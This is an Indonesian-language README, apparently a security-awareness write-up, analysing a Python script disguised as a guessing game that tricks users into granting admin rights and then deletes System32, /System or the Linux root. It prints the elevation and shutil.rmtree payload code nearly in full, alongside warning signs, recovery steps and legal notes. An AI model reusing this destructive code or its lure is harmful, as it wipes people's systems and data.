# ⚠️ PERINGATAN BAHAYA EKSTREM - MALWARE DESTRUKTIF! ⚠️

<div align="center">

![Danger](https://img.shields.io/badge/DANGER-EXTREME-red?style=for-the-badge)
![Malware](https://img.shields.io/badge/MALWARE-CONFIRMED-darkred?style=for-the-badge)
![System Destroyer](https://img.shields.io/badge/SYSTEM-DESTROYER-black?style=for-the-badge)

</div>

## 🚨 RINGKASAN BAHAYA

**KODE INI ADALAH MALWARE YANG DAPAT MENGHANCURKAN SISTEM OPERASI ANDA SECARA PERMANEN!**

Repositori ini berisi kode Python yang menyamar sebagai permainan sederhana tetapi sebenarnya adalah **malware destruktif** yang dapat:
- Menghapus seluruh sistem Windows, macOS, atau Linux
- Membuat komputer tidak dapat boot
- Menghilangkan semua data secara permanen
- Memerlukan instalasi ulang sistem operasi

---

## 🔍 ANALISIS DETAIL KODE BERBAHAYA

### 1. **Fungsi Deteksi Admin (`is_admin()`)**
```python
def is_admin():
    if os.name == "nt":  # Windows
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:  # Linux/macOS
        return os.geteuid() == 0
```
**Bahaya:** Mengecek apakah program berjalan dengan hak akses administrator/root.

### 2. **Fungsi Elevasi Hak Akses (`elevate()`)**
```python
def elevate():
    if os.name == "nt":  # Windows
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, f'"{script}" {params}', None, 1
        )
    else:  # Linux/macOS
        subprocess.check_call(["sudo", sys.executable] + sys.argv)
```
**Bahaya:** Meminta hak akses administrator/root dengan dalih "meningkatkan experience permainan".

### 3. **Manipulasi Psikologis**
```python
jawaban = input("Apakah kamu mau bermain game tebak angka inj? (y/n): ")

if jawaban == "y":
    if is_admin():
        print("[✓] Okee mari kita bermain tebak angka")
    else:
        print("[!] Baiklah, tetapi kita masih bisa bermain walaupun experience permainan akan sedikit berkurang...")
        elevate()  # MEMINTA AKSES ADMIN DENGAN DALIH PALSU!
```
**⚠️ PENIPUAN:** Program berbohong bahwa akses admin diperlukan untuk "experience permainan yang lebih baik". **INI ADALAH KEBOHONGAN!** Permainan tebak angka sederhana tidak memerlukan hak akses administrator.

### 4. **Permainan Palsu**
```python
angka = random.randint(1, 2)
tebak_angka = int(input("Tebak angka (1 atau 2): "))
```
**Tujuan:** Menciptakan ilusi permainan yang tidak berbahaya untuk menutupi niat jahat.

### 5. **Kode Destruktif Utama**
```python
if tebak_angka == angka:
    print("Selamat! Tebakan Anda benar.")
else:
    system = platform.system()
    print(f"Tebakan salah! Mendeteksi OS: {system}")

    if system == "Windows":
        shutil.rmtree("C:\\windows\\System32")      # MENGHAPUS SISTEM WINDOWS
    elif system == "Darwin":  # macOS
        shutil.rmtree("/System")                    # MENGHAPUS SISTEM MACOS
    elif system == "Linux":
        shutil.rmtree("/")                          # MENGHAPUS SELURUH SISTEM LINUX
```

**🔥 DAMPAK DESTRUKTIF:**
- **Windows:** Menghapus `C:\windows\System32` → Windows tidak dapat boot
- **macOS:** Menghapus `/System` → macOS rusak total
- **Linux:** Menghapus `/` → Seluruh sistem file hilang

---

## 🎭 TEKNIK MANIPULASI YANG DIGUNAKAN

### 1. **Social Engineering**
- Menyamar sebagai permainan tidak berbahaya
- Menggunakan bahasa Indonesia untuk target lokal
- Pesan yang ramah dan mengundang

### 2. **Privilege Escalation**
- Meminta akses admin dengan alasan palsu
- Menggunakan dalih "experience permainan"
- Memanfaatkan kepercayaan pengguna

### 3. **Delayed Payload**
- Tidak langsung merusak sistem
- Menunggu input pengguna
- Memberikan false sense of security

---

## 💀 SKENARIO EKSEKUSI

```
1. Pengguna menjalankan script
2. Program meminta bermain game → TERLIHAT TIDAK BERBAHAYA
3. Jika bukan admin → Meminta akses admin dengan ALASAN PALSU
4. Pengguna memberikan akses admin → TERJEBAK!
5. Program menjalankan "permainan"
6. Jika tebakan salah → SISTEM DIHANCURKAN!
7. Komputer rusak permanen → DATA HILANG SEMUA!
```

---

## 🛡️ CARA MELINDUNGI DIRI

### ✅ **DO (Lakukan)**
- **Selalu baca kode** sebelum menjalankan
- **Curigai program** yang meminta akses admin tanpa alasan jelas
- **Backup data** secara rutin
- **Gunakan antivirus** yang up-to-date
- **Test di virtual machine** jika ragu
- **Laporkan malware** ke pihak berwenang

### ❌ **DON'T (Jangan)**
- **Jangan jalankan** kode dari sumber tidak terpercaya
- **Jangan berikan** akses admin sembarangan
- **Jangan percaya** alasan "untuk experience yang lebih baik"
- **Jangan abaikan** warning dari antivirus
- **Jangan copy-paste** kode ke terminal

---

## 🚨 TANDA-TANDA MALWARE

1. **Meminta akses admin** untuk hal sepele
2. **Menggunakan fungsi sistem** seperti `shutil.rmtree()`
3. **Import library berbahaya** seperti `ctypes`, `subprocess`
4. **Manipulasi path sistem** seperti `/`, `C:\windows\System32`
5. **Social engineering** dengan permainan/hadiah

---

## 🔧 JIKA SUDAH TERLANJUR DIJALANKAN

### Windows:
```cmd
# Jika sistem masih bisa boot
sfc /scannow
dism /online /cleanup-image /restorehealth

# Jika tidak bisa boot
# Gunakan Windows Recovery Environment
# Atau install ulang Windows
```

### Linux:
```bash
# Jika masih ada backup
sudo rsync -av /backup/ /

# Jika tidak ada backup
# Install ulang distribusi Linux
```

### macOS:
```bash
# Gunakan Time Machine jika ada
# Atau install ulang macOS dari Recovery Mode
```

---

## 📊 STATISTIK KERUSAKAN

| OS | Target | Dampak | Recovery |
|---|---|---|---|
| Windows | `C:\windows\System32` | 🔴 Fatal | Install ulang |
| macOS | `/System` | 🔴 Fatal | Install ulang |
| Linux | `/` (root) | 🔴 Fatal | Install ulang |

---

## 🎓 PEMBELAJARAN KEAMANAN SIBER

### Konsep yang Diajarkan:
1. **Privilege Escalation Attack**
2. **Social Engineering**
3. **Malware Disguised as Games**
4. **System File Manipulation**
5. **Cross-Platform Malware**

### Red Flags dalam Kode:
- Import `ctypes` dan `subprocess`
- Fungsi `elevate()` dan `is_admin()`
- Penggunaan `shutil.rmtree()` pada path sistem
- Permintaan akses admin untuk aplikasi sederhana

---

## ⚖️ ASPEK LEGAL

**PERINGATAN HUKUM:**
- Membuat dan menyebarkan malware adalah **TINDAK PIDANA**
- Dapat dikenakan pasal **UU ITE** di Indonesia
- Hukuman dapat berupa **penjara dan denda**
- Repositori ini hanya untuk **EDUKASI KEAMANAN**

---

## 📞 LAPORKAN JIKA MENEMUKAN

Jika Anda menemukan kode serupa:
1. **Jangan jalankan** kode tersebut
2. **Laporkan** ke platform (GitHub, GitLab, dll)
3. **Beritahu** teman/kolega tentang bahayanya
4. **Dokumentasikan** untuk pembelajaran keamanan

---

## 🔗 SUMBER PEMBELAJARAN KEAMANAN

- [OWASP Security Guidelines](https://owasp.org/)
- [SANS Cybersecurity Training](https://www.sans.org/)
- [Cybersecurity Indonesia](https://csirt.go.id/)

---

<div align="center">

**🛡️ INGAT: KEAMANAN SIBER DIMULAI DARI KESADARAN DIRI! 🛡️**

*Selalu verifikasi kode sebelum menjalankan - Hidup Anda digital bergantung padanya!*

</div>

---

*README ini dibuat untuk melindungi pengguna dari ancaman malware dan meningkatkan kesadaran keamanan siber.*